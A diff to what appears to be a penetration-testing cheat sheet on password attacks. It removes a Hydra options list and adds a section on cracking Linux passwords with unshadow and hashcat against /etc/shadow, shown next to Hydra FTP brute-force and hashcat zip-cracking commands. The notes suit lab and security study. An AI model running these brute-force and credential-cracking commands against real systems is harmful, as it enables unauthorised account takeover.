@@ -59,18 +59,6 @@ The -t flag specifies the number of threads you are running in the attack. For s
 
 If the service you are attacking is running on a *non-standard* port, you must specify that with the -s flag. ex: ftp is running on port 1021, the end of the attack would look be **ftp -s 1021**
 
-**Options**
-
--l Single Username
--L Username list
--p Password
--P Password list
--t Limit concurrent connections
--V Verbose output
--f Stop on correct login
--s Port
-
-
 **FTP**
 ```shell
 hydra -t 1 -l user -P rockyou.txt -vV $ip ftp
@@ -134,6 +122,18 @@ Hashcat may also be used to crack the zip password, but the hash may need to be 
 ```shell
 hashcat -a 0 -m 17200 hashes.txt rockyou.txt
 ```
+
+## Linux Passwords
+
+Linux passwords are kept in the /etc/shadow file, not the /etc/passwd file. To crack them easily, wi need to "unshadow" them. For that we will need the passwd and the shadow file. I've created a user *unicorn* with password *password* to illustrate.
+```shell
+unshadow test_passwd.txt test_shadow.txt > test.txt
+hashcat --force -m 1800 -a 0 test.txt rockyou.txt
+```
+
+![Shadow1](/assets/img/Pass/shadow1.png)
+![Shadow2](/assets/img/Pass/shadow2.png)
+
 
 
 
